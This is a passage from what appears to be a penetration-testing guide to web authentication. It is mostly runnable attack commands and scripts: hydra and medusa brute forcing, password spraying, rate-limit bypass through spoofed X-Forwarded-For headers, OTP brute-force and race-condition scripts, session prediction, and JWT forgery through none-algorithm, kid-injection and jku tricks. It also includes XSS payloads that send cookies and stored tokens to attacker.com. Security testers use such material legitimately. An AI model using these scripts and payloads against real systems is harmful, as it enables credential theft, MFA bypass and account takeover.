hydra -L users.txt -P password_patterns.txt http-post-form "target.com/login:username=^USER^&password=^PASS^:F=incorrect"

# Test with Burp Intruder
# 1. Capture login request
# 2. Send to Intruder
# 3. Set payload positions on password field
# 4. Load password pattern list
# 5. Check responses for successful authentication
```

**Password Reuse Testing:**

```bash
# Test if passwords can be reused after reset
# 1. Create account with password: TestPass123!
# 2. Change password to: NewPass456!
# 3. Attempt to change back to: TestPass123!
# 4. Check if system allows password reuse

# Test password history enforcement
curl -X POST http://target.com/change-password \
  -H "Cookie: session=abc123" \
  -d "old_password=NewPass456!&new_password=TestPass123!&confirm=TestPass123!"
```

**Default Credentials Testing:**

```bash
# Common default credentials
admin:admin
admin:password
administrator:administrator
root:root
admin:admin123
user:user
test:test

# Default credentials wordlists
/usr/share/seclists/Passwords/Default-Credentials/
/usr/share/metasploit-framework/data/wordlists/default_userpass_for_services_unhash.txt

# Test with Hydra
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-post-form "target.com/login:username=^USER^&password=^PASS^:F=incorrect"

# Metasploit default scanner
msfconsole
use auxiliary/scanner/http/http_login
set RHOSTS target.com
set USER_FILE /usr/share/metasploit-framework/data/wordlists/http_default_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
run
```

**Brute Force Testing:**

```bash
# Hydra HTTP POST brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# Hydra with custom parameters
hydra -l admin -P passwords.txt target.com http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:F=Incorrect:H=Cookie: security=low; PHPSESSID=abc123"

# Parameters explained:
# /login.php - Login endpoint
# user=^USER^ - Username parameter
# pass=^PASS^ - Password parameter
# F=Incorrect - Failure string to detect failed login
# H=Cookie: - Additional headers

# Medusa brute force
medusa -h target.com -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login -T 10

# Patator brute force
patator http_fuzz url=http://target.com/login method=POST body='username=admin&password=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'
```

**Rate Limiting Testing:**

```bash
# Test account lockout mechanism
# Send multiple failed login attempts

for i in {1..20}; do
    echo "Attempt $i"
    curl -X POST http://target.com/login \
      -d "username=admin&password=wrongpass$i" \
      -v -s | grep -i "lock\|attempt\|block"
    sleep 1
done

# Test if lockout is IP-based or account-based
# From different IP:
curl -X POST http://target.com/login \
  -d "username=admin&password=test" \
  --proxy http://proxy-server:port

# Check for:
# - No lockout (critical vulnerability)
# - Lockout after X attempts
# - Temporary vs permanent lockout
# - Lockout bypass using X-Forwarded-For header
```

**X-Forwarded-For Bypass Testing:**

```bash
# Test if rate limiting uses X-Forwarded-For
curl -X POST http://target.com/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -d "username=admin&password=test"

# Rotate IP addresses to bypass rate limiting
for i in {1..100}; do
    curl -X POST http://target.com/login \
      -H "X-Forwarded-For: 192.168.1.$i" \
      -d "username=admin&password=test$i"
done

# Other headers to test:
# X-Real-IP
# X-Originating-IP
# X-Remote-IP
# X-Client-IP
# CF-Connecting-IP
```

**Password Reset Mechanism Analysis:**

```bash
# Test password reset token predictability
# 1. Request password reset for user1
# 2. Capture reset token from email/URL
# 3. Request password reset for user2
# 4. Compare tokens for patterns

# Example token analysis
# Token 1: abc123def456
# Token 2: abc124def456
# Analysis: Sequential, predictable

# Test token reuse
curl http://target.com/reset-password?token=abc123def456
# Use same token again
curl http://target.com/reset-password?token=abc123def456

# Test token expiration
# Request token, wait X minutes, attempt to use
curl http://target.com/reset-password?token=abc123def456

# Test weak token generation
# MD5 of timestamp
# Sequential numbers
# Username-based tokens
```

**Username Enumeration:**

```bash
# Test registration endpoint
curl -X POST http://target.com/register \
  -d "username=admin&password=Test123!" \
  | grep -i "exists\|taken\|already"

# Test login endpoint timing
# Valid username typically has different response time
time curl -X POST http://target.com/login -d "username=admin&password=wrong"
time curl -X POST http://target.com/login -d "username=nonexistent&password=wrong"

# Test password reset
curl -X POST http://target.com/forgot-password \
  -d "email=admin@target.com" \
  | grep -i "sent\|not found\|invalid"

# Different responses indicate enumeration:
# "Password reset sent" - user exists
# "Email not found" - user doesn't exist

# Automate with Burp Intruder
# 1. Capture forgot password request
# 2. Send to Intruder
# 3. Set payload position on email/username
# 4. Load username wordlist
# 5. Analyze response differences
```

**Kerbrute - Active Directory Username Enumeration:**

```bash
# Enumerate AD usernames (if target uses Kerberos)
kerbrute userenum -d domain.local --dc 192.168.1.100 /usr/share/seclists/Usernames/Names/names.txt

# Password spray attack
kerbrute passwordspray -d domain.local --dc 192.168.1.100 users.txt 'Password123!'

# Brute force single user
kerbrute bruteuser -d domain.local --dc 192.168.1.100 passwords.txt admin
```

### MFA Bypass Possibilities

Multi-Factor Authentication (MFA) adds additional security layers beyond passwords. Testing MFA implementations can reveal critical bypasses.

**MFA Implementation Analysis:**

```bash
# Identify MFA type:
# - SMS-based OTP
# - Email-based OTP
# - TOTP (Time-based One-Time Password - Google Authenticator)
# - Push notifications
# - Hardware tokens
# - Biometric

# Test MFA enforcement
# 1. Enable MFA on test account
# 2. Authenticate with username/password
# 3. Observe MFA challenge
# 4. Test various bypass techniques
```

**MFA Bypass Technique 1 - Direct Access After First Factor:**

```bash
# Test if critical functions accessible after password verification
# Before completing MFA challenge

# Step 1: Login with valid credentials
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies.txt -v

# Step 2: Don't submit MFA code, try accessing protected resource
curl http://target.com/dashboard \
  -b cookies.txt

# Step 3: Check if access granted without MFA verification
```

**MFA Bypass Technique 2 - Status Code Manipulation:**

```bash
# Some applications check MFA status in cookies or tokens

# After first factor authentication, check cookies
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies.txt -v

# Look for cookies like:
# mfa_required=true
# mfa_verified=false
# auth_level=1

# Attempt to modify
curl http://target.com/dashboard \
  -b "session=abc123; mfa_verified=true"

# Or modify in request
curl -X POST http://target.com/verify-mfa \
  -d "mfa_required=false" \
  -b cookies.txt
```

**MFA Bypass Technique 3 - OTP Brute Force:**

```bash
# Test if OTP can be brute forced (typically 6 digits = 1,000,000 combinations)

# Check for rate limiting on OTP verification
for otp in {000000..000100}; do
    echo "Testing OTP: $otp"
    response=$(curl -s -X POST http://target.com/verify-otp \
      -b "session=abc123" \
      -d "otp=$otp")
    
    if echo "$response" | grep -q "success"; then
        echo "[!] Valid OTP found: $otp"
        break
    fi
done

# Python script for OTP brute force
cat > otp_brute.py <<'EOF'
#!/usr/bin/env python3
import requests

url = "http://target.com/verify-otp"
cookies = {"session": "abc123"}

for otp in range(0, 1000000):
    otp_str = str(otp).zfill(6)
    data = {"otp": otp_str}
    
    response = requests.post(url, cookies=cookies, data=data)
    
    if "success" in response.text or response.status_code == 302:
        print(f"[!] Valid OTP found: {otp_str}")
        break
    
    if otp % 100 == 0:
        print(f"[*] Tested {otp} codes...")
EOF

chmod +x otp_brute.py
python3 otp_brute.py
```

**MFA Bypass Technique 4 - OTP Reuse:**

```bash
# Test if OTP can be reused

# Step 1: Request OTP
curl -X POST http://target.com/request-otp \
  -d "username=user"

# Step 2: Use OTP first time
curl -X POST http://target.com/verify-otp \
  -b "session=abc123" \
  -d "otp=123456"

# Step 3: Logout and try to reuse same OTP
curl -X POST http://target.com/logout \
  -b "session=abc123"

# Step 4: Login again and try same OTP
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies2.txt

curl -X POST http://target.com/verify-otp \
  -b cookies2.txt \
  -d "otp=123456"
```

**MFA Bypass Technique 5 - Backup Codes Weakness:**

```bash
# Test backup/recovery codes

# Generate backup codes
curl -X POST http://target.com/generate-backup-codes \
  -b "session=abc123"

# Analyze backup code format:
# Sequential: 12345671, 12345672, 12345673 (predictable)
# Short length: 6 characters (bruteforceable)
# No expiration
# Unlimited reuse

# Test backup code brute force if weak
for code in {100000..100100}; do
    curl -X POST http://target.com/verify-backup-code \
      -b "session=abc123" \
      -d "code=$code"
done
```

**MFA Bypass Technique 6 - Account Recovery Bypass:**

```bash
# Test if account recovery bypasses MFA

# Scenario 1: Password reset doesn't require MFA
curl -X POST http://target.com/forgot-password \
  -d "email=user@target.com"

# Check if password reset link bypasses MFA

# Scenario 2: Email change without MFA
curl -X POST http://target.com/change-email \
  -b "session=abc123" \
  -d "new_email=attacker@evil.com"

# If successful, control email and reset password
```

**MFA Bypass Technique 7 - Race Condition:**

```bash
# Concurrent requests might bypass MFA check

# Python script for race condition testing
cat > mfa_race.py <<'EOF'
#!/usr/bin/env python3
import requests
import threading

url = "http://target.com/verify-otp"
cookies = {"session": "abc123"}
data = {"otp": "000000"}

def send_request():
    response = requests.post(url, cookies=cookies, data=data)
    if response.status_code == 200:
        print(f"[!] Potential bypass: {response.text[:100]}")

# Send 100 concurrent requests
threads = []
for i in range(100):
    t = threading.Thread(target=send_request)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
EOF

chmod +x mfa_race.py
python3 mfa_race.py
```

**MFA Bypass Technique 8 - OAuth/Social Login Bypass:**

```bash
# Test if OAuth login bypasses MFA

# Step 1: Enable MFA on account
# Step 2: Link social media account (Google, Facebook)
# Step 3: Logout
# Step 4: Login via OAuth

# Check if MFA is required for OAuth authentication
curl http://target.com/oauth/google/callback?code=auth_code

# If MFA not enforced on OAuth, this is a bypass
```

**MFA Bypass Technique 9 - Remember Device Feature:**

```bash
# Test "Remember this device" functionality

# Step 1: Login with MFA
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies.txt

curl -X POST http://target.com/verify-otp \
  -b cookies.txt \
  -d "otp=123456&remember_device=true"

# Step 2: Extract device token
grep "device_token" cookies.txt

# Step 3: Test if device token can be:
# - Reused indefinitely
# - Transferred to different IP
# - Used without session cookie
# - Predicted or enumerated
```

**MFA Bypass Technique 10 - API Endpoint Bypass:**

```bash
# Test if API endpoints enforce MFA

# Web interface requires MFA:
curl -X POST http://target.com/web/change-password \
  -b "session=abc123" \
  -d "new_password=test"
# Response: MFA required

# API endpoint might not:
curl -X POST http://target.com/api/v1/change-password \
  -H "Authorization: Bearer token" \
  -d "new_password=test"
# Response: Password changed

# Test all API versions
curl -X POST http://target.com/api/v1/...
curl -X POST http://target.com/api/v2/...
curl -X POST http://target.com/api/internal/...
```

**MFA Testing with Burp Suite:**

```bash
# Burp Suite methodology:
# 1. Enable MFA on test account
# 2. Login and intercept traffic
# 3. Analyze MFA flow
# 4. Test modifications:
#    - Remove MFA parameters
#    - Change mfa_required=true to false
#    - Skip MFA verification endpoint
#    - Replay old MFA tokens
#    - Brute force OTP codes
# 5. Use Burp Repeater for testing
# 6. Use Burp Intruder for OTP brute force
```

**TOTP Token Generation Testing:**

```bash
# If TOTP secret is exposed or weak

# Install oathtool
apt-get install oathtool

# Generate TOTP code from secret
oathtool --totp --base32 JBSWY3DPEHPK3PXP

# If secret is predictable or leaked, can generate valid codes
# Test with captured secret
oathtool --totp --base32 <captured_secret>
```

### Session Management Flaws

Session management vulnerabilities allow attackers to hijack or manipulate user sessions, gaining unauthorized access.

**Session Token Analysis:**

```bash
# Capture session tokens from multiple logins
# Analyze for patterns

# Login 5 times and collect tokens
for i in {1..5}; do
    echo "Login $i:"
    curl -X POST http://target.com/login \
      -d "username=user$i&password=pass$i" \
      -c cookies_$i.txt -v 2>&1 | grep -i "set-cookie"
done

# Extract session tokens
grep "session" cookies_*.txt

# Analyze tokens for:
# - Length and character set
# - Encoding (hex, base64, plain)
# - Predictability (sequential, timestamp-based)
# - Entropy (randomness)
```

**Session Token Entropy Testing:**

```python
#!/usr/bin/env python3
# session_entropy.py

import requests
import base64
import hashlib
from collections import Counter

url = "http://target.com/login"
tokens = []

# Collect 100 session tokens
for i in range(100):
    response = requests.post(url, data={"username": f"user{i}", "password": f"pass{i}"})
    token = response.cookies.get('session')
    if token:
        tokens.append(token)
        print(f"Token {i+1}: {token}")

# Analyze tokens
print("\n[*] Token Analysis:")
print(f"Total tokens collected: {len(tokens)}")
print(f"Unique tokens: {len(set(tokens))}")

# Check for patterns
if len(tokens) > 1:
    # Check if sequential
    try:
        int_tokens = [int(t, 16) for t in tokens[:10]]
        diffs = [int_tokens[i+1] - int_tokens[i] for i in range(len(int_tokens)-1)]
        if len(set(diffs)) == 1:
            print("[!] Tokens appear sequential!")
    except:
        pass
    
    # Check token length consistency
    lengths = [len(t) for t in tokens]
    print(f"Token lengths: {set(lengths)}")
```

**Session Fixation Testing:**

```bash
# Test if application accepts pre-set session tokens

# Step 1: Obtain a session token before authentication
curl http://target.com/ -c initial_cookies.txt
session_id=$(grep "session" initial_cookies.txt | awk '{print $7}')
echo "[*] Pre-auth session ID: $session_id"

# Step 2: Login with this session
curl -X POST http://target.com/login \
  -b "session=$session_id" \
  -d "username=victim&password=password" \
  -c post_login_cookies.txt

# Step 3: Check if session ID remains the same
new_session_id=$(grep "session" post_login_cookies.txt | awk '{print $7}')
echo "[*] Post-auth session ID: $new_session_id"

# If session_id == new_session_id, vulnerable to session fixation
if [ "$session_id" == "$new_session_id" ]; then
    echo "[!] Vulnerable to session fixation!"
fi

# Attack scenario:
# 1. Attacker gets session ID: abc123
# 2. Attacker sends link to victim: http://target.com/?session=abc123
# 3. Victim clicks link and logs in
# 4. Attacker uses session abc123 to access victim's account
```

**Session Hijacking via XSS:**

```html
<!-- If XSS exists, steal session cookies -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- Or use fetch -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Test if HttpOnly flag is set (prevents JavaScript access) -->
<!-- In browser console: -->
<script>
console.log(document.cookie);
// If session cookie visible, HttpOnly not set
</script>
```

**Session Cookie Attribute Testing:**

```bash
# Test cookie security attributes

# Capture Set-Cookie header
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -v 2>&1 | grep -i "set-cookie"

# Check for security attributes:
# HttpOnly - Prevents JavaScript access
# Secure - Only transmitted over HTTPS
# SameSite - CSRF protection

# Example secure cookie:
# Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

# Example insecure cookie:
# Set-Cookie: session=abc123

# Test if Secure flag missing (cookie sent over HTTP)
curl http://target.com/dashboard \
  -b "session=abc123"

# If successful, Secure flag not enforced
```

**Session Timeout Testing:**

```bash
# Test session expiration

# Step 1: Login and get session
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies.txt

# Step 2: Wait specified time (e.g., 30 minutes)
sleep 1800

# Step 3: Attempt to access protected resource
curl http://target.com/dashboard \
  -b cookies.txt

# Check response:
# - Still authenticated: No timeout or very long timeout
# - Redirected to login: Timeout working

# Test absolute vs idle timeout:
# Absolute: Session expires after X time regardless of activity
# Idle: Session expires after X time of inactivity

# Continuous activity test
for i in {1..60}; do
    curl http://target.com/dashboard -b cookies.txt -s > /dev/null
    echo "Request $i at $(date)"
    sleep 60 # Wait 1 minute between requests
done
```

**Session Invalidation Testing:**

```bash
# Test if logout properly invalidates session

# Step 1: Login
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies.txt

# Step 2: Access protected resource (confirm session works)
curl http://target.com/dashboard -b cookies.txt

# Step 3: Logout
curl -X POST http://target.com/logout -b cookies.txt

# Step 4: Try to access protected resource with old session
curl http://target.com/dashboard -b cookies.txt

# If still accessible, session not properly invalidated
```

**Concurrent Session Testing:**

```bash
# Test if multiple sessions allowed for same user

# Terminal 1: Login and get session1
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies1.txt

# Terminal 2: Login same user, get session2
curl -X POST http://target.com/login \
  -d "username=user&password=pass" \
  -c cookies2.txt

# Test if both sessions work simultaneously
curl http://target.com/dashboard -b cookies1.txt
curl http://target.com/dashboard -b cookies2.txt

# If both work: Multiple concurrent sessions allowed
# Security concern: Harder to detect account compromise
```

**Session Prediction Attack:**

```bash
# If tokens are predictable, generate valid sessions

# Collect tokens and analyze pattern
cat > predict_session.py <<'EOF'
#!/usr/bin/env python3
import requests
import hashlib
import time

# Example: If tokens are MD5 of timestamp
def generate_token(timestamp):
    return hashlib.md5(str(timestamp).encode()).hexdigest()

# Try predicting current valid tokens
current_time = int(time.time())

for offset in range(-60, 60):  # ±60 seconds
    test_time = current_time + offset
    predicted_token = generate_token(test_time)
    
    # Test predicted token
    cookies = {'session': predicted_token}
    response = requests.get('http://target.com/dashboard', cookies=cookies)
    
    if response.status_code == 200 and "Welcome" in response.text:
        print(f"[!] Valid session found: {predicted_token}")
        print(f"[!] Timestamp: {test_time}")
        break
EOF

python3 predict_session.py
```

### Token Vulnerabilities

Token vulnerabilities affect JWT (JSON Web Tokens), API tokens, CSRF tokens, and other authentication tokens used in modern applications.

**JWT Token Analysis:**

```bash
# Capture JWT token
# Typically in Authorization header: Bearer eyJhbGc...

# Decode JWT (without verification)
# JWT structure: header.payload.signature

# Manual decoding
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Output: {"alg":"HS256","typ":"JWT"}

# Online tools:
# https://jwt.io
# Paste token to decode

# Command-line JWT decoding
cat > decode_jwt.sh <<'EOF'
#!/bin/bash
jwt="$1"
IFS='.' read -r header payload signature <<< "$jwt"

echo "[*] Header:"
echo "$header" | base64 -d 2>/dev/null | jq '.' 2>/dev/null || echo "$header" | base64 -d

echo -e "\n[*] Payload:"
echo "$payload" | base64 -d 2>/dev/null | jq '.' 2>/dev/null || echo "$payload" | base64 -d

echo -e "\n[*] Signature:"
echo "$signature"
EOF

chmod +x decode_jwt.sh
./decode_jwt.sh "eyJhbGc...full_token_here"
```

**JWT Vulnerability Testing - None Algorithm:**

```bash
# Test if "none" algorithm accepted (no signature verification)

# Original JWT with HS256:
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature

# Modified JWT with none algorithm:
# 1. Change algorithm to "none" in header
# 2. Remove signature

# Create header: {"alg":"none","typ":"JWT"}
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Create payload: {"user":"admin"}
echo -n '{"user":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'
# Output: eyJ1c2VyIjoiYWRtaW4ifQ

# Combine with empty signature:
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Test the token
curl http://target.com/api/admin \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
```

**JWT Vulnerability Testing - Weak Secret:**

```bash
# Brute force JWT secret

# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Crack JWT secret
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# If secret is weak (e.g., "secret", "password"), can forge tokens

# Hashcat JWT cracking
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# JWT format for hashcat:
# Save token to jwt.txt in format:
# eyJhbGc...

# John the Ripper JWT cracking
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

**JWT Vulnerability Testing - Algorithm Confusion:**

```bash
# RS256 to HS256 confusion attack
# If server uses RS256 (RSA) but accepts HS256 (HMAC)
# Attacker can use public key as HMAC secret

# Steps:
# 1. Obtain public key from /.well-known/jwks.json or similar
# 2. Modify JWT algorithm from RS256 to HS256
# 3. Sign token using public key as HMAC secret

# Using jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem

# Manual approach with Python
cat > jwt_confusion.py <<'EOF'
#!/usr/bin/env python3
import jwt
import json

# Original RS256 JWT payload
payload = {"user": "admin", "role": "admin"}

# Read public key (PEM format)
with open('public.pem', 'r') as f:
    public_key = f.read()

# Sign with HS256 using public key as secret
token = jwt.encode(payload, public_key, algorithm='HS256')
print(f"[*] Forged token: {token}")
EOF

python3 jwt_confusion.py
```

**JWT Vulnerability Testing - Key ID (kid) Manipulation (continued):**

```bash
# Test kid parameter injection

# Original JWT header:
# {"alg":"HS256","typ":"JWT","kid":"key1"}

# Test various kid injections:

# 1. Path traversal
{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}
# If successful, empty file used as secret (null byte)

# 2. SQL injection
{"alg":"HS256","typ":"JWT","kid":"key1' UNION SELECT 'secret'--"}

# 3. Command injection
{"alg":"HS256","typ":"JWT","kid":"key1; whoami"}

# 4. Arbitrary file read
{"alg":"HS256","typ":"JWT","kid":"../../../../../../etc/passwd"}

# Using jwt_tool for kid injection
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "../../../../../../dev/null"

# Manual kid manipulation
cat > jwt_kid_exploit.py <<'EOF'
#!/usr/bin/env python3
import jwt
import base64
import json

# Payload to encode
payload = {"user": "admin", "role": "admin"}

# Header with malicious kid
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../dev/null"
}

# If kid points to /dev/null (empty file), sign with empty secret
token = jwt.encode(
    payload, 
    "", 
    algorithm="HS256",
    headers=header
)

print(f"[*] Malicious JWT: {token}")
EOF

python3 jwt_kid_exploit.py
```

**JWT Vulnerability Testing - JKU/X5U Header Injection:**

```bash
# JKU (JWK Set URL) and X5U (X.509 URL) header injection

# Original header:
# {"alg":"RS256","typ":"JWT","jku":"https://trusted.com/jwks.json"}

# Attack: Point to attacker-controlled server
# {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}

# Setup attacker's JWKS endpoint
cat > jwks.json <<'EOF'
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "xGOr...base64_modulus...",
      "e": "AQAB"
    }
  ]
}
EOF

# Host the JWKS file
python3 -m http.server 80

# Create JWT with jku pointing to attacker server
cat > jwt_jku_exploit.py <<'EOF'
#!/usr/bin/env python3
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# Generate RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

# Payload
payload = {"user": "admin", "role": "admin"}

# Header with malicious jku
header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "http://attacker.com/jwks.json",
    "kid": "attacker-key"
}

# Sign token with attacker's private key
token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers=header
)

print(f"[*] Forged JWT: {token}")
EOF

python3 jwt_jku_exploit.py
```

**JWT Vulnerability Testing - Token Expiration:**

```bash
# Test if exp (expiration) claim is validated

# Decode existing JWT
jwt_payload=$(echo "<JWT_TOKEN>" | cut -d'.' -f2 | base64 -d 2>/dev/null)
echo "$jwt_payload" | jq '.'

# Check exp claim (Unix timestamp)
# Current time: date +%s

# Test scenarios:
# 1. Remove exp claim entirely
# 2. Set exp to far future
# 3. Set exp to past (already expired)
# 4. Use expired token after logout

# Modify token with jwt_tool
python3 jwt_tool.py <JWT_TOKEN> -I -pc exp -pv 9999999999

# Test expired token
curl http://target.com/api/protected \
  -H "Authorization: Bearer <EXPIRED_TOKEN>"

# If access granted, expiration not validated
```

**JWT Vulnerability Testing - Claim Injection:**

```bash
# Test if additional claims can elevate privileges

# Original token payload:
# {"user":"normaluser","role":"user"}

# Modified payload:
# {"user":"normaluser","role":"admin"}
# {"user":"normaluser","role":"user","admin":true}
# {"user":"normaluser","role":"user","isAdmin":true}

# Using jwt_tool to inject claims
python3 jwt_tool.py <JWT_TOKEN> -I -pc role -pv admin

# Test claim variations
python3 jwt_tool.py <JWT_TOKEN> -I -pc admin -pv true
python3 jwt_tool.py <JWT_TOKEN> -I -pc isAdmin -pv true
python3 jwt_tool.py <JWT_TOKEN> -I -pc privileges -pv '["admin","root"]'

# Manual claim injection
cat > jwt_claim_inject.py <<'EOF'
#!/usr/bin/env python3
import jwt
import json

# If you know the secret (or using 'none' algorithm)
secret = "known_secret"  # or "" for none algorithm

# Modified payload
payload = {
    "user": "normaluser",
    "role": "admin",  # Escalated privilege
    "iat": 1234567890,
    "exp": 9999999999
}

# For 'none' algorithm attack
header = {"alg": "none", "typ": "JWT"}
token = jwt.encode(payload, "", algorithm="none", headers=header)

print(f"[*] Forged token (none): {token}")

# For known secret
token_hs256 = jwt.encode(payload, secret, algorithm="HS256")
print(f"[*] Forged token (HS256): {token_hs256}")
EOF

python3 jwt_claim_inject.py
```

**API Token Testing:**

```bash
# Test API token security

# 1. Token entropy and predictability
# Collect multiple API tokens
curl -X POST http://target.com/api/generate-token \
  -H "Authorization: Bearer <SESSION_TOKEN>"

# Analyze tokens for patterns
# - Sequential numbers
# - Timestamp-based
# - Weak randomness

# 2. Token permissions
# Test if token can access unauthorized resources
curl http://target.com/api/admin/users \
  -H "Authorization: Bearer <USER_TOKEN>"

# 3. Token revocation
# Generate token, revoke it, test if still works
curl -X POST http://target.com/api/revoke-token \
  -H "Authorization: Bearer <TOKEN_TO_REVOKE>"

curl http://target.com/api/protected \
  -H "Authorization: Bearer <REVOKED_TOKEN>"

# If access granted, revocation not working

# 4. Token expiration
# Check if old tokens still work
curl http://target.com/api/protected \
  -H "Authorization: Bearer <OLD_TOKEN>"

# 5. Token scope validation
# Generate token with limited scope
# Test if scope restrictions enforced

curl -X POST http://target.com/api/generate-token \
  -d "scope=read" \
  -H "Authorization: Bearer <SESSION_TOKEN>"

# Try write operation with read-only token
curl -X DELETE http://target.com/api/resource/123 \
  -H "Authorization: Bearer <READ_ONLY_TOKEN>"
```

**OAuth Token Testing:**

```bash
# OAuth 2.0 vulnerability testing

# 1. Authorization code interception
# Test if authorization code can be reused
# Capture: http://redirect.com/callback?code=AUTH_CODE

curl -X POST http://target.com/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT_ID"

# Try using same code again
curl -X POST http://target.com/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=CLIENT_ID"

# If successful twice, code reuse vulnerability

# 2. Redirect URI manipulation
# Test if redirect_uri validation is weak
http://target.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=http://attacker.com&
  response_type=code

# Test variations:
# http://attacker.com
# http://legitimate.com.attacker.com
# http://legitimate.com@attacker.com
# http://legitimate.com?attacker.com
# http://legitimate.com#attacker.com

# 3. State parameter testing
# Check if state parameter validated (CSRF protection)
http://target.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=http://client.com/callback&
  response_type=code
  # Missing state parameter

# 4. Implicit flow testing
# Test if access_token exposed in URL fragment
http://target.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=http://client.com/callback&
  response_type=token

# If redirected to:
# http://client.com/callback#access_token=TOKEN
# Token exposed in browser history and referrer
```

**CSRF Token Testing:**

```bash
# Test CSRF token implementation

# 1. Token presence
# Check if CSRF token required for state-changing operations
curl -X POST http://target.com/change-email \
  -b "session=abc123" \
  -d "new_email=attacker@evil.com"
  # Without CSRF token

# If successful, CSRF protection missing

# 2. Token validation
# Test with invalid token
curl -X POST http://target.com/change-email \
  -b "session=abc123" \
  -d "new_email=attacker@evil.com&csrf_token=invalid"

# 3. Token reuse
# Use same token for multiple requests
csrf_token="captured_token"

curl -X POST http://target.com/action1 \
  -b "session=abc123" \
  -d "csrf_token=$csrf_token&data=test1"

curl -X POST http://target.com/action2 \
  -b "session=abc123" \
  -d "csrf_token=$csrf_token&data=test2"

# If both succeed, token not single-use

# 4. Token in GET request
# Test if token accepted in URL (easier to exploit)
curl "http://target.com/change-email?new_email=attacker@evil.com&csrf_token=TOKEN" \
  -b "session=abc123"

# 5. Token in Referer validation
# Test if only Referer header checked instead of token
curl -X POST http://target.com/change-email \
  -b "session=abc123" \
  -H "Referer: http://target.com/settings" \
  -d "new_email=attacker@evil.com"

# Remove Referer
curl -X POST http://target.com/change-email \
  -b "session=abc123" \
  -d "new_email=attacker@evil.com"
```

**Bearer Token Testing:**

```bash
# Test Bearer token security

# 1. Token in URL
# Check if token transmitted in URL (logged in server logs)
curl "http://target.com/api/data?access_token=BEARER_TOKEN"

# Should use header instead:
curl http://target.com/api/data \
  -H "Authorization: Bearer BEARER_TOKEN"

# 2. Token over HTTP
# Test if token transmitted over unencrypted connection
curl http://target.com/api/data \
  -H "Authorization: Bearer BEARER_TOKEN"

# Should require HTTPS

# 3. Token in response
# Check if token unnecessarily included in responses
curl http://target.com/api/user \
  -H "Authorization: Bearer BEARER_TOKEN" \
  | grep -i "token\|bearer"

# 4. Token storage
# Check where tokens stored client-side
# - localStorage (vulnerable to XSS)
# - sessionStorage (vulnerable to XSS)
# - Cookie with HttpOnly (more secure)

# Test XSS-based token theft if stored insecurely
<script>
fetch('http://attacker.com/steal?token=' + localStorage.getItem('access_token'));
</script>
```

### Comprehensive Authentication Testing Workflow

**Phase 1: Information Gathering**

```bash
# Identify authentication mechanisms
curl -s http://target.com/login | grep -i "form\|oauth\|saml\|sso"

# Check for authentication headers
curl -I http://target.com/api

# Identify token types used
# - Session cookies
# - JWT
# - API keys
# - OAuth tokens

# Technology detection
whatweb http://target.com
wappalyzer (browser extension)
```

**Phase 2: Password Policy Testing**

```bash
# Test password requirements
curl -X POST http://target.com/register \
  -d "username=test&password=weak" \
  -v

# Test common passwords
hydra -l admin -P common-passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Test default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
